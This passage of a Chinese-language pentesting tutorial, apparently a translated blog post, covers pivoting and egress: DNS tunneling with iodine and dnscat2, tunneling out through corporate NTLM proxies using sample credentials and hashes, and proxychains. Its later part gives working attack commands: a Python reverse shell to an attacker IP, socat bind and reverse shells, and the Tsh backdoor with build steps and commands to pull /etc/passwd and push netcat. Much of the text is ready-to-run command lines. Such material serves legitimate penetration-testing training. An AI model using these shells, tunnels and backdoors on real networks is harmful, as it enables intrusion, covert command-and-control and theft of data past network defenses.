<h3 id="DNS-隧道"><a href="#DNS-隧道" class="headerlink" title="DNS 隧道"></a>DNS 隧道</h3><p>如果有任何广域网流量被阻塞，但是外部主机名被解析，那么就有可能通过DNS查询来进行隧道通信。你需要注册一个用于此技术工作的域名。<a href="http://dev.kryo.se/iodine/wiki/HowtoSetup">这个手册</a>可能会帮助你设置你的名称服务器。</p>
<h4 id="Iodine"><a href="#Iodine" class="headerlink" title="Iodine"></a>Iodine</h4><p>如果发生这种情况，并且在服务器上获得了 root 访问权限，你可以试试 <a href="http://code.kryo.se/iodine/">iodine</a>。它几乎像 hans icmp 隧道工具一样工作 - 它创建了一对 tun 适配器，并将它们之间的数据作为 DNS 查询进行隧道传输。服务器端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iodine -f -P P@ssw0rd tunneldomain.com -r</span><br></pre></td></tr></table></figure>

<p>连接成功将在地址 1.1.1.2 处产生直接的客户端可见性。请注意，这种隧道技术非常慢。你最好的选择是在生成的连接上使用一个压缩的 ssh 连接：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080</span><br></pre></td></tr></table></figure>

<h4 id="Dnscat2"><a href="#Dnscat2" class="headerlink" title="Dnscat2"></a>Dnscat2</h4><p><a href="https://github.com/iagox86/dnscat2">Dnscat2</a> 通过递归 DNS 查询建立 C＆C 通道。这个工具不需要 root/administrator 权限（在 windows 和 linux 上都可以）。它也支持端口转发。服务器端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ruby ./dnscat2.rb tunneldomain.com</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./dnscat2 tunneldomain.com</span><br></pre></td></tr></table></figure>

<p>在收到服务器端的连接后，可以使用 <code>windows</code> 命令查看活动会话：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dnscat2&gt; windows</span><br><span class="line">0 :: main [active]</span><br><span class="line">  dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*]</span><br><span class="line">  1 :: <span class="built_in">command</span> session (debian)</span><br><span class="line">  2 :: sh (debian) [*]</span><br></pre></td></tr></table></figure>

<p>要启动端口转发，请选择带有 <code>session -i &lt;num&gt;</code> 的命令会话：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dnscat2&gt; session -i 1</span><br><span class="line">New window created: 1</span><br><span class="line">New window created: 1</span><br><span class="line">history_size (session) =&gt; 1000</span><br><span class="line">This is a <span class="built_in">command</span> session!</span><br><span class="line"></span><br><span class="line">That means you can enter a dnscat2 <span class="built_in">command</span> such as</span><br><span class="line"><span class="string">&#x27;ping&#x27;</span>! For a full list of clients, try <span class="string">&#x27;help&#x27;</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">command</span> session (debian) 1&gt;</span><br></pre></td></tr></table></figure>

<p>使用 <code>listen [lhost:]lport rhost:rport</code> 命令转发一个端口：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">command</span> session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80</span><br></pre></td></tr></table></figure>

<p>这将绑定攻击者机器上的 8080 端口，并将所有连接转发到 10.0.0.20:80。</p>
<h3 id="公司的-HTTP-代理作为一种出路"><a href="#公司的-HTTP-代理作为一种出路" class="headerlink" title="公司的 HTTP 代理作为一种出路"></a>公司的 HTTP 代理作为一种出路</h3><p>HTTP 代理组织的地方为他们的员工访问外部网络应用程序提供了一个良好的渗出机会，因为你有正确的凭据;）</p>
<h4 id="Rpivot-1"><a href="#Rpivot-1" class="headerlink" title="Rpivot"></a>Rpivot</h4><p>我已经在 NAT 穿越部分提到了这个工具。它还支持通过 NTLM HTTP 代理连接到外部世界。服务器端命令保持不变，使用客户端命令如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999\</span><br><span class="line">--ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\</span><br><span class="line">--username Alice --password P@ssw0rd</span><br></pre></td></tr></table></figure>

<p>或者如果你有 LM:NT 哈希而不是密码：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python client.py --server-ip &lt;rpivot_server_ip&gt;\</span><br><span class="line">--server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\</span><br><span class="line">--username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45</span><br></pre></td></tr></table></figure>

<h4 id="Cntlm"><a href="#Cntlm" class="headerlink" title="Cntlm"></a>Cntlm</h4><p><a href="http://cntlm.sourceforge.net/">Cntlm</a> 是通过 NTLM 代理运行任何非代理感知程序的首选工具。基本上这个工具对一个代理进行身份验证，并将本地端口绑定到你指定的外部服务。这个端口绑定不需要任何认证，所以你可以直接使用你的工具（例如 putty/ssh）。它使用配置文件进行操作。这里有一个准系统配置的例子来转发端口 443（这个端口是最有可能被允许通过代理的）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Username Alice</span><br><span class="line">Password P@ssw0rd</span><br><span class="line">Domain CONTOSO.COM</span><br><span class="line">Proxy 10.0.0.10:8080</span><br><span class="line">Tunnel 2222:&lt;attackers_machine&gt;:443</span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cntlm.exe -c config.conf</span><br></pre></td></tr></table></figure>

<p>或者如果你在 Linux 上：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./cntlm -c config.conf</span><br></pre></td></tr></table></figure>

<p>现在，假设你已经在远程主机的 443 端口上运行 ssh，你可以启动 ssh 客户端（openssh/putty）并连接到本地端口 2222 来访问外部机器。</p>
<h4 id="通过-HTTP-代理的-OpenVpn"><a href="#通过-HTTP-代理的-OpenVpn" class="headerlink" title="通过 HTTP 代理的 OpenVpn"></a>通过 HTTP 代理的 OpenVpn</h4><p><a href="https://openvpn.net/index.php/open-source/documentation/howto.html">OpenVpn</a> 是巨大的，所以它从头开始的配置超出了这篇文章的范围。只需简单提一下 - 它也支持通过 NTLM 代理的隧道 TCP 连接。将此行添加到你的配置文件中：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http-proxy &lt;proxy_ip&gt; 8080 &lt;file_with_creds&gt; ntlm</span><br></pre></td></tr></table></figure>

<p>凭证文件应该在不同的行上包含用户名和密码。而且，是的，你需要 root。</p>
<h2 id="利用带有-proxychains-的-SOCKS"><a href="#利用带有-proxychains-的-SOCKS" class="headerlink" title="利用带有 proxychains 的 SOCKS"></a>利用带有 proxychains 的 SOCKS</h2><p>如果你的程序不使用原始套接字（例如，nmap syn-scan），那么很可能你可以使用 <code>proxychains</code> 来强制你的程序通过 socks 代理。编辑 /etc/proxychains.conf 中的代理服务器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"><span class="comment"># add proxy here ...</span></span><br><span class="line"><span class="comment"># meanwile</span></span><br><span class="line"><span class="comment"># defaults set to &quot;tor&quot;</span></span><br><span class="line">socks4  127.0.0.1 3128</span><br></pre></td></tr></table></figure>

<p>准备好了，只需在你最喜欢的 pwn 工具上添加 <code>proxychains</code>：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">proxychains program_name</span><br></pre></td></tr></table></figure>

<p>与 proxychains 一起使用的 impacket&#39;s psexec.py：</p>
<p><img src="/images/pivoting1.png"></p>
<h2 id="DNS-与-proxychains"><a href="#DNS-与-proxychains" class="headerlink" title="DNS 与 proxychains"></a>DNS 与 proxychains</h2><p>Proxychains 在解析主机名时不遵循 socks RFC。它拦截 <code>gethostbyname</code> libc 调用并通过 socks 代理隧道化 tcp DNS 请求。事情是，DNS 服务器硬编码到 <code>4.2.2.2</code>。你可能需要更改名称服务器以解析内部网络上的名称。一个典型的情况是如果你正在测试 Windows 环境，将名称服务器更改为域控制器。该设置位于 <code>/usr/lib/proxychains3/proxyresolv</code>：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># This script is called by proxychains to resolve DNS names</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DNS server used to resolve names</span></span><br><span class="line">DNS_SERVER=<span class="variable">$&#123;PROXYRESOLV_DNS:-4.2.2.2&#125;</span>    <span class="comment">#change nameserver here</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> = 0 ] ; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  usage:&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;      proxyresolv &lt;hostname&gt; &quot;</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h2 id="美化你的-web-shell"><a href="#美化你的-web-shell" class="headerlink" title="美化你的 web shell"></a>美化你的 web shell</h2><p>这部分内容与 pivoting 或 tunneling 没有直接关系，而是描述了在内部网络发展攻击时简化工作的方法。通常情况下，使用 web-shell 非常繁琐，特别是在使用需要交互式命令界面的程序时。很可能你会使用一些解决方法来执行简单的任务，比如将密码传递给 sudo/su 或者只是编辑一个文件。我不是一个折磨自己的狂热爱好者，所以当有一个机会将 web-shell 升级到一个交互式 shell 时，我这样做:)我不会介绍像使用 bash/perl/python 等启动半交互式 shell。有很多关于这样做的信息。看看这个反向 shell 备忘单 - <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a> 。</p>
<h3 id="Python-PTY-shell"><a href="#Python-PTY-shell" class="headerlink" title="Python PTY shell"></a>Python PTY shell</h3><p>从常规的半交互式 shell 升级。你可以在现有的 shell 中执行以下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>或者启动反向连接：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;\</span></span><br><span class="line"><span class="string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\</span></span><br><span class="line"><span class="string">s.connect((&quot;&lt;attackers_ip&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h3><p>Netcat 的加强版！可是说实话，去检查这个<a href="http://www.dest-unreach.org/socat/">工具</a>的手册 <code>man socat</code>，你会惊奇你可以用这个工具做隧道化的工作。除此之外，它可以产生一个完全交互的 shell，甚至比前面提到的 python-pty 更好。缺点是你很可能将不得不在目标服务器上编译/安装这个工具，因为它不是大多数类 Unix 发行版中的默认工具。</p>
<h4 id="绑定-shell"><a href="#绑定-shell" class="headerlink" title="绑定 shell"></a>绑定 shell</h4><p>设置监听器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>

<p>连接到监听器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat FILE:`tty`,raw,<span class="built_in">echo</span>=0 TCP:&lt;victim_ip&gt;:1337</span><br></pre></td></tr></table></figure>

<h4 id="反向-shell"><a href="#反向-shell" class="headerlink" title="反向 shell"></a>反向 shell</h4><p>设置监听器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,<span class="built_in">echo</span>=0</span><br></pre></td></tr></table></figure>

<p>连接到攻击者的机器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>

<h4 id="终端大小"><a href="#终端大小" class="headerlink" title="终端大小"></a>终端大小</h4><p>默认情况下，终端的大小是相当小的，当启动 <code>top</code> 命令或使用文本编辑器编辑文件时你可能会注意到。你可以很容易地改变这个，使用 <code>stty -a</code> 命令来获得你的常规终端的大小：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ stty -a</span><br><span class="line">speed 38400 baud; rows 57; columns 211; line = 0;</span><br></pre></td></tr></table></figure>

<p>将所需的尺寸应用到你的 socat 终端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">stty rows 57 cols 211</span><br></pre></td></tr></table></figure>

<h3 id="Tsh"><a href="#Tsh" class="headerlink" title="Tsh"></a>Tsh</h3><p><a href="https://github.com/creaktive/tsh">Tsh</a> 是一个小型的 ssh 式后门，带有完整的 pty 终端，并具有文件传输能力。这个工具的占用空间非常小，并且很容易在大多数类 Unix 系统上编译。从编辑 tsh.h 文件开始：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _TSH_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _TSH_H</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *secret = <span class="string">&quot;never say never say die&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_PORT 22</span></span><br><span class="line"><span class="keyword">short</span> <span class="keyword">int</span> server_port = SERVER_PORT;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#define CONNECT_BACK_HOST  &quot;localhost&quot;</span></span><br><span class="line"><span class="comment">#define CONNECT_BACK_DELAY 30</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_FILE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT_FILE 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RUNSHELL 3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* tsh.h */</span></span></span><br></pre></td></tr></table></figure>

<p>更改 <code>secret</code>，指定 <code>SERVER_PORT</code>。如果你想反向连接，取消注释并编辑 <code>CONNECT_BACK_HOST</code> 和 <code>CONNECT_BACK_DELAY</code> 指令。运行 make：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ make linux_x64</span><br><span class="line">make								\</span><br><span class="line">	LDFLAGS=<span class="string">&quot; -Xlinker --no-as-needed -lutil&quot;</span>	\</span><br><span class="line">	DEFS=<span class="string">&quot; -DLINUX&quot;</span>					\</span><br><span class="line">	tsh tshd</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/tmp/tsh&#x27;</span></span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c pel.c</span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c aes.c</span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c sha1.c</span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c tsh.c</span><br><span class="line">gcc -Xlinker --no-as-needed -lutil -o tsh pel.o aes.o sha1.o tsh.o</span><br><span class="line">strip tsh</span><br><span class="line">gcc -O3 -W -Wall -DLINUX -c tshd.c</span><br><span class="line">gcc -Xlinker --no-as-needed -lutil -o tshd pel.o aes.o sha1.o tshd.o</span><br><span class="line">strip tshd</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/tmp/tsh&#x27;</span></span><br></pre></td></tr></table></figure>

<p>现在在服务器上运行 <code>./tshd</code>。它将开始监听指定的端口。您可以通过执行以下命令连接到它：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./tsh host_ip</span><br></pre></td></tr></table></figure>

<p>如果 tsh 被编译有反向连接功能，<code>tshd</code> 守护进程将尝试连接回攻击者的机器。在攻击者侧启动监听：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./tsh cb</span><br><span class="line">Waiting <span class="keyword">for</span> the server to connect...</span><br></pre></td></tr></table></figure>

<p>用 tsh 传输文件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./tsh host_ip get /etc/passwd .</span><br><span class="line">./tsh host_ip put /bin/netcat /tmp</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
</search>
